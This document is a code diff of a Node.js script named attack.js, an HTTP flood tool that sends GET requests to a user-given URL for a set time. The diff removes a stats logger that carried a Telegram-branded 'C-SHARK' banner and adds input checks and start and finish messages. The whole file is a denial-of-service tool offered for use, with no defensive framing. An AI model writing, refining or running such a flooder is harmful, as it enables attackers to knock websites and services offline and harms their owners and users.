@@ -1,59 +1,38 @@
 const axios = require('axios');
 
-// Get args
+// Args: node attack.js <target_url> <time_in_seconds>
 const [,, targetUrl, timeInSeconds] = process.argv;
+
 if (!targetUrl || !timeInSeconds) {
   console.log('Usage: node attack.js <target_url> <time_in_seconds>');
   process.exit(1);
 }
 
-const durationMs = parseInt(timeInSeconds) * 1000;
-const stopTime = Date.now() + durationMs;
+const durationMs = parseInt(timeInSeconds, 10) * 1000;
+if (isNaN(durationMs) || durationMs <= 0) {
+  console.log('Please provide a valid time in seconds.');
+  process.exit(1);
+}
 
-let total = 0;
-let success = 0;
-let blocked = 0;
-let maxRps = 0;
-let lastTotal = 0;
+let totalRequests = 0;
 
-// Flooder
-function flood() {
+// Clear terminal and print start banner
+console.clear();
+console.log('C-SHARK! - ATTACK STARTED');
+
+const startTime = Date.now();
+const stopTime = startTime + durationMs;
+
+// Continuous flooder
+const flood = async () => {
   while (Date.now() < stopTime) {
-    axios.get(targetUrl).then(() => success++).catch(() => blocked++);
-    total++;
+    axios.get(targetUrl).catch(() => {}); // Ignore errors
+    totalRequests++;
   }
-}
 
-// Logging every 100ms, overwriting single terminal output
-function startLogger() {
-  const logInterval = setInterval(() => {
-    const rps = total - lastTotal;
-    if (rps > maxRps) maxRps = rps;
-    lastTotal = total;
+  // After flood ends
+  console.log('\nATTACK DONE');
+  console.log('Total requests sent:', totalRequests);
+};
 
-    const remaining = Math.max(0, Math.floor((stopTime - Date.now()) / 1000));
-
-    process.stdout.write(
-      `\rC-SHARKV1 - T.ME/STSVKINGDOM | Sent: ${total} | Max-RPS: ${maxRps} | Success: ${success} | Blocked: ${blocked} | Time Left: ${remaining}s `
-    );
-
-    if (Date.now() >= stopTime) {
-      clearInterval(logInterval);
-      process.stdout.write('\nFlood complete.\n');
-    }
-  }, 100);
-}
-
-// Start flood in batches (to prevent blocking single thread)
-function startFlooding() {
-  const floodInterval = setInterval(() => {
-    if (Date.now() >= stopTime) {
-      clearInterval(floodInterval);
-      return;
-    }
-    flood();
-  }, 0);
-}
-
-startLogger();
-startFlooding();
+flood();
